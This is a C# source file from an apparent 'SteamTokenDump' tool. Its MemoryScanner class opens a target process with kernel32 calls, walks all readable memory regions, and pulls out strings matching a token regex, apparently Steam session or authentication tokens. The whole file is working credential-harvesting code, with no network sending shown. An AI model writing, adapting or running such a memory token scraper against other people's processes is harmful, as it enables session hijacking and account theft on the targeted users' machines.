using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

namespace SteamTokenDump
{
    internal static class MemoryScanner
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int VirtualQueryEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            out MEMORY_BASIC_INFORMATION lpBuffer,
            uint dwLength);

        private const uint PROCESS_VM_READ = 0x0010;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_READONLY = 0x02;
        private const uint PAGE_EXECUTE_READ = 0x20;

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        public static async Task<HashSet<string>> ScanProcessMemoryAsync(Process process, Encoding encoding, Regex regex)
        {
            var uniqueTokens = new HashSet<string>();
            IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, process.Id);

            if (processHandle == IntPtr.Zero)
            {
                Logger.Warning($"Failed to open process {process.ProcessName} (PID: {process.Id}).");
                return uniqueTokens;
            }

            try
            {
                IntPtr address = IntPtr.Zero;
                MEMORY_BASIC_INFORMATION mbi;

                while (VirtualQueryEx(processHandle, address, out mbi, (uint)Marshal.SizeOf<MEMORY_BASIC_INFORMATION>()) != 0)
                {
                    bool isReadable = mbi.State == MEM_COMMIT &&
                                      (
                                        (mbi.Protect & PAGE_READWRITE) == PAGE_READWRITE ||
                                        (mbi.Protect & PAGE_READONLY) == PAGE_READONLY ||
                                        (mbi.Protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ
                                      );

                    if (isReadable)
                    {
                        long regionSize = mbi.RegionSize.ToInt64();
                        if (regionSize <= 0)
                        {
                            address = IntPtr.Add(mbi.BaseAddress, (int)mbi.RegionSize.ToInt64());
                            continue;
                        }

                        const int bufferSize = 4096;
                        byte[] buffer = new byte[bufferSize];
                        long bytesToRead = regionSize;
                        IntPtr currentAddress = mbi.BaseAddress;

                        while (bytesToRead > 0)
                        {
                            int chunkSize = (int)Math.Min(bufferSize, bytesToRead);
                            if (chunkSize <= 0)
                                break;

                            bool success = ReadProcessMemory(processHandle, currentAddress, buffer, chunkSize, out int bytesRead);
                            if (success && bytesRead > 0)
                            {
                                var extracted = TokenExtractor.ExtractTokens(buffer, bytesRead, encoding, regex);
                                foreach (var token in extracted)
                                {
                                    uniqueTokens.Add(token);
                                }
                                bytesToRead -= bytesRead;
                                currentAddress = IntPtr.Add(currentAddress, bytesRead);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }

                    long nextAddress = mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64();
                    if (nextAddress < 0 || nextAddress > (IntPtr.Size == 4 ? int.MaxValue : long.MaxValue))
                    {
                        break;
                    }

                    address = new IntPtr(nextAddress);
                }
            }
            finally
            {
                CloseHandle(processHandle);
            }

            return uniqueTokens;
        }
    }
}
